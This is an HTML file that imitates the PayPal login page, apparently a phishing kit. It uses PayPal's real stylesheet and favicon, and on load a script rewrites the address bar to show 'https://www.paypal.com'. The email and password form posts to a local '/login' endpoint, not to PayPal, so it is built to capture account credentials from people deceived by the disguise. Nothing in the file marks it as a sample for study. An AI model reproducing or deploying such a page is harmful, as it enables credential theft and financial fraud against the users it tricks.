<!DOCTYPE html>
<html lang="en" class="no-js desktop">

<head>
    <title>Log in to your PayPal account</title>
    <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
    <link rel="stylesheet"
        href="https://www.paypalobjects.com/web/res/087/9f731d8bcedd5b7e7a3975c024278/css/contextualLoginElementalUIv5.css" />
    </style>
    <script>
        function signup() {
            window.location.href = "https://www.paypal.com/in/webapps/mpp/account-selection"
        }
        document.addEventListener('DOMContentLoaded', () => {
            window.history.pushState({}, '', 'https://www.paypal.com');
        });
    </script>
</head>

<body class="desktop">
    <section id="login" class="login  " data-role="page" data-title="Log in to your PayPal account">
        <div class="corral " style="position:sticky; margin-top: -50px;">
            <div id="content" class="contentContainer activeContent contentContainerBordered">
                <header id="header">
                    <p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long signin-paypal-logo">
                    </p>
                </header>
                <div id="loginContent" class="">
                    <div id="loginSection" class="">
                        <div class="notifications"></div>
                        <form action="/login" method="POST">
                            <div id="passwordSection" class="clearfix splitEmail">
                                <div id="splitEmailSection" class="splitPhoneSection splitEmailSection">
                                    <div class="textInput " id="login_emaildiv">
                                        <div class="fieldWrapper">
                                            <input id="email" name="email" type="email"
                                                class="hasHelp  validateEmpty   " required="required"
                                                placeholder="Email or mobile number"
                                                aria-describedby="emailErrorMessage" />
                                            <label for="email" class="fieldLabel">Email or mobile number</label>
                                        </div>
                                    </div>
                                </div>
                                <div id="passwordSection" class="clearfix showHideButtonForEligibleBrowser">
                                    <div class="textInput " id="login_passworddiv">
                                        <div class="fieldWrapper">
                                            <input id="password" name="password" type="password"
                                                class="hasHelp  validateEmpty   pin-password" required="required"
                                                value="" placeholder="Password"
                                                aria-describedby="passwordErrorMessage" />
                                            <label for="password" class="fieldLabel">Password</label>
                                        </div>
                                        <div class="errorMessage" id="passwordErrorMessage">
                                            <p class="emptyError hide">Required.</p>
                                        </div>
                                    </div><a href="https://www.paypal.com/authflow/password-recovery/"
                                        id="setupPassword" class="recoveryOption forgotPassword hide"
                                        data-client-log-action-type="clickSetupPasswordLink">Set up a password</a><a
                                        href="https://www.paypal.com/authflow/password-recovery/" id="forgotPassword"
                                        class="recoveryOption forgotPassword "
                                        data-client-log-action-type="clickForgotPasswordLink">Forgotten
                                        password?</a>
                                </div>
                            </div><input type="hidden" id="phone" name="login_phone" class="validate" />
                            <div class="actions"><button class="button actionContinue scTrack:unifiedlogin-login-submit"
                                    type="submit" id="btnLogin" name="btnLogin" value="Login">Log In</button></div>
                        </form>

                        <div class="moreOptionsDiv  hide" id="moreOptionsContainer"><a href="#" id="moreOptions"
                                class="moreOptionsInfo">More options</a>
                            <div class="bubble-tooltip hide" id="moreOptionsDropDown">
                                <ul class="moreoptionsGroup">
                                    <li><a href="#" id="moreOptionsMobile"
                                            class="scTrack:unifiedlogin-click-more-options-mobile">Approve login
                                            using mobile device</a></li>
                                    <li><a href="https://www.paypal.com/authflow/password-recovery/"
                                            class="scTrack:unifiedlogin-click-forgot-password pwrLink">Having
                                            trouble logging in?</a></li>
                                </ul>
                            </div>
                        </div>
                        <div id="tryAnotherWayLinkContainer" class="tryAnotherWayLinkContainer hide"
                            data-hide-on-pass=""><a href='#' id="tryAnotherWayLink">Confirm another way</a></div>

                        <div id="signupContainer" class="signupContainer " data-hide-on-email="" data-hide-on-pass="">
                            <div class="loginSignUpSeparator "><span class="textInSeparator">or</span></div>
                            <button onclick="signup()" href="https://www.paypal.com/in/webapps/mpp/account-selection"
                                class="button secondary scTrack:unifiedlogin-click-signup-button"
                                id="createAccount">Sign Up</button>
                        </div>

                        <div id="tpdButtonContainer" class="signupContainer hide">
                            <div class="loginSignUpSeparator"><span class="textInSeparator">or</span></div>
                            <div class="actions"><button class="button secondary" id="tpdButton" type="submit"
                                    value="Approve login using mobile device">Approve login using mobile
                                    device</button></div>
                        </div>
                    </div>
                </div>
                <div class="intentFooter ">
                    <div class="localeSelector  "><span class="picker country-selector hide"><span class="hide"
                                id="countryPickerLink">India</span><button type="button" aria-label="countryPickerLink"
                                class="country IN"></button></span>
                        <ul class="localeLink"></ul>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <br><br><br>
    <footer class="footer" role="contentinfo">
        <div class="legalFooter">
            <ul class="footerGroup">
                <li><a target="_blank" href="https://www.paypal.com/smarthelp/contact-us">Contact Us</a></li>
                <li><a target="_blank" href="https://www.paypal.com/webapps/mpp/ua/privacy-full">Privacy</a></li>
                <li><a target="_blank" href="https://www.paypal.com/webapps/mpp/ua/legalhub-full">Legal</a></li>
                <li><a target="_blank" href="https://www.paypal.com/webapps/mpp/country-worldwide">Worldwide</a></li>
            </ul>
        </div>
    </footer>
    </div>
</body>

</html>
